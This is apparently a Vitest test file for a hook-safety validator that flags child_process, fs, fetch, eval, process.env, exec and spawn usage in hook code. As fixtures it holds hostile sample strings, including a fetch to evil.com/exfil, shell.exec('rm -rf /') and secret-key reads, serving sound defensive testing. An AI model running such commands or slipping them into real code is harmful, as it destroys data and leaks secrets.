import { describe, it, expect } from "vitest";
import { validateHookSafety } from "../../../src/security/hook-validator.js";

describe("validateHookSafety", () => {
  it("safe on empty code", () => {
    const result = validateHookSafety("");
    expect(result.safe).toBe(true);
    expect(result.violations).toHaveLength(0);
  });

  it("safe on benign code", () => {
    const result = validateHookSafety("const x = 1;\nconsole.log(x);");
    expect(result.safe).toBe(true);
  });

  it("catches child_process require", () => {
    const result = validateHookSafety(`const cp = require('child_process');`);
    expect(result.safe).toBe(false);
    expect(result.violations[0]?.pattern).toBe("child_process");
  });

  it("catches fs require", () => {
    const result = validateHookSafety(`const fs = require("fs");`);
    expect(result.safe).toBe(false);
    expect(result.violations[0]?.pattern).toBe("fs direct");
  });

  it("catches fetch call", () => {
    const result = validateHookSafety(`fetch("https://evil.com/exfil")`);
    expect(result.safe).toBe(false);
    expect(result.violations[0]?.pattern).toBe("fetch");
  });

  it("catches eval", () => {
    const result = validateHookSafety(`eval("malicious code")`);
    expect(result.safe).toBe(false);
    expect(result.violations[0]?.pattern).toBe("eval");
  });

  it("catches new Function", () => {
    const result = validateHookSafety(`const fn = new Function("return 1")`);
    expect(result.safe).toBe(false);
    expect(result.violations[0]?.pattern).toBe("new Function");
  });

  it("catches process.env access", () => {
    const result = validateHookSafety(`const key = process.env.SECRET_KEY;`);
    expect(result.safe).toBe(false);
    expect(result.violations[0]?.pattern).toBe("process.env");
  });

  it("catches .exec call", () => {
    const result = validateHookSafety(`shell.exec("rm -rf /")`);
    expect(result.safe).toBe(false);
    expect(result.violations[0]?.pattern).toBe("exec");
  });

  it("catches .spawn call", () => {
    const result = validateHookSafety(`proc.spawn("bash")`);
    expect(result.safe).toBe(false);
    expect(result.violations[0]?.pattern).toBe("spawn");
  });

  it("reports correct line number", () => {
    const code = `const x = 1;\nconst y = 2;\neval("bad")`;
    const result = validateHookSafety(code);
    expect(result.violations[0]?.line).toBe(3);
  });

  it("reports multiple violations", () => {
    const code = `eval("a")\nfetch("b")`;
    const result = validateHookSafety(code);
    expect(result.violations.length).toBeGreaterThanOrEqual(2);
  });

  it("reports matched text", () => {
    const result = validateHookSafety(`eval("test")`);
    expect(result.violations[0]?.match).toContain("eval");
  });

  it("catches ESM child_process import", () => {
    const result = validateHookSafety(`import { execSync } from "child_process";`);
    expect(result.safe).toBe(false);
    expect(result.violations.some((v) => v.pattern === "child_process")).toBe(true);
  });

  it("catches node:-prefixed specifiers", () => {
    expect(validateHookSafety(`import cp from "node:child_process";`).safe).toBe(false);
    expect(validateHookSafety(`const fs = require("node:fs");`).safe).toBe(false);
    expect(validateHookSafety(`import { writeFile } from "node:fs/promises";`).safe).toBe(false);
  });

  it("catches dynamic import()", () => {
    const result = validateHookSafety(`const cp = await import("child_process");`);
    expect(result.safe).toBe(false);
    expect(result.violations.some((v) => v.pattern === "dynamic import")).toBe(true);
  });

  it("catches bare-specifier ESM import statement", () => {
    const result = validateHookSafety(`import "child_process";`);
    expect(result.safe).toBe(false);
  });

  it("catches bracket-access eval on globalThis", () => {
    const result = validateHookSafety(`globalThis["eval"]("bad");`);
    expect(result.safe).toBe(false);
    expect(result.violations.some((v) => v.pattern === "indirect eval")).toBe(true);
  });

  it("catches bracket-access Function constructor", () => {
    const result = validateHookSafety(`const F = globalThis["Function"];`);
    expect(result.safe).toBe(false);
  });

  it('catches process["env"] bracket access', () => {
    const result = validateHookSafety(`const key = process["env"].SECRET;`);
    expect(result.safe).toBe(false);
    expect(result.violations.some((v) => v.pattern === "process.env")).toBe(true);
  });
});
